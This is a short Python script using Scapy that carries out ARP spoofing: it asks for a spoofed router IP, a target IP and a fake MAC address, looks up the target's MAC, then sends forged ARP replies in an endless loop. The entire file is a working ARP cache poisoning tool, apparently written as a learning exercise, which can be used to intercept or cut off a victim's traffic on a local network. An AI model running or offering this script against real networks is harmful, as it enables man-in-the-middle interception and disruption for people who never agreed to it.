#import scapy
from scapy.all import *
from scapy.all import Ether, ARP
# Forging the broadcast addr
broadcast = Ether(dst='ff:ff:ff:ff:ff:ff')
# Browsing falsified Ethernet broadcast addr
# broadcast.show()

# Defining spoof target
spoof_target = input('Enter spoof src IP [192.168.2.1]: ')
target_IP = input('Enter target\'s IP [192.168.2.65]: ')
# Falsifying Router's MAC address
router_mac_addr = input('Enter preferred Spoofing MAC addr [00:50:56:fu:ck:yu]: ')
# Entering Router's IP addr
#router_IP = input('Enter Router\'s IP [192.168.2.1]: ')
# Crafting the ARP layer
arp_layer = ARP(psrc=spoof_target, pdst=target_IP, hwsrc=router_mac_addr)

# Browsing arp_layer
#arp_layer.show()

# Defining the Entire packet
entire_packet = broadcast/arp_layer
# Browsing entire_packet
# entire_packet.show()

# Storing the answer to a variable
# To test whether target responds
# and we only need the response header
answer = srp(entire_packet,timeout=2,verbose=True)[0]

# Browsing the answer
# Target must have received => responded to your srp 
# in order for you to view answer[0]
#print(f'answer[0]:')
#print(answer[0])

# Print target's MAC address from response
#print(f'Target\'s MAC addr:\n')
#print(answer[0][1].hwsrc)

# Store target's MAC address to a variable
# If there's NO answer
# target's MAC address might have been spoofed
if not answer:
    target_mac_addr = router_mac_addr
# If NOT spoof, use target's res MAC addr
else:
    target_mac_addr = answer[0][1].hwsrc

# Crafting the ARP spoofing packet before sending out
# ls(ARP) to view ARP properties
# op=2 => response
# hwdst => target_mac_addr
# pdst => target's IP addr
# psrc => spoofed address => Router's IP addr
packet = ARP(op=2, hwdst=target_mac_addr, pdst=target_IP, psrc=spoof_target)

# Browsing the packet
#packet.show()

# Using an inifinite loop to send ARP spoofing packets
while True:
    try:
        send(packet, verbose=True)
    except ValueError as e:
        continue
